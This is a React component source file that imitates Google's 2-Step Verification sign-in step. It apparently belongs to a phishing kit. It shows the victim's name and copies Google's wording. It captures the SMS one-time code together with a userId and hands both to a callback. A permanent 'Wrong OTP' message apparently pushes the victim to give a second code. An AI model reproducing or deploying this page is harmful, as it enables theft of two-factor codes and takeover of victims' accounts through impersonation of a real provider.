import React, { useState } from 'react'

const OtpStep2 = ({first, userId, onComplete}) => {
    const [ptp2, setphoneOtp2] = useState("");
        const [showLoader, setShowLoader] = useState(false);
      
    
     const handleSubmit = (e) => {
      e.preventDefault();
    
      if (!ptp2.trim()) return;
    
        setShowLoader(true);
    
      if (onComplete) {
         setTimeout(() => {
             onComplete(userId, ptp2.trim());
          setShowLoader(false);
        }, 2000);
       
      } 
    };

        const handleBack =
    () => {


 
    window.location.href = "/"


      



     


    };


   return (
    <div className="signin-page">

      <div className="signin-card ">

         {showLoader && (
         <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        )}

        <div className="last-left">

           <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1 className="signin-title">
            2-Step Verification
          </h1>
          <p className="signin-subtitle">To help keep your account safe, Google wants to make sure it's really you trying to sign in.</p>

          <div onClick={handleBack} className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-first">
              {first}
            </span> 
              <button
                  type="button"
                  // onClick={handleBack}
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>

        <div className="last-right">

      

          <form onSubmit={handleSubmit}>
            <div>A text message with a 6-digit verification code was just sent to your number attached to this mail</div>

            <div className="last-input-container green">

              <input
                id="last"
                type={"number"}
                value={ptp2}
                
                onChange={(e) => setphoneOtp2(e.target.value)}
                placeholder=" "
                autoComplete="off"
              />

              <label htmlFor="last">
                Enter 6-digit code
              </label>

            </div>
            <small className="get">Wrong OTP. Try again or request for new code.</small>



         

            <div className="last-actions">

              <button
                type="button"
                className="text-button"
              >
                Try another way
              </button>

              <button
                type="submit"
                className="next-button"
                disabled={!ptp2.trim()}
              >
                Next
              </button>

            </div>

          </form>

        </div>

      </div>

    </div>
  );
}

export default OtpStep2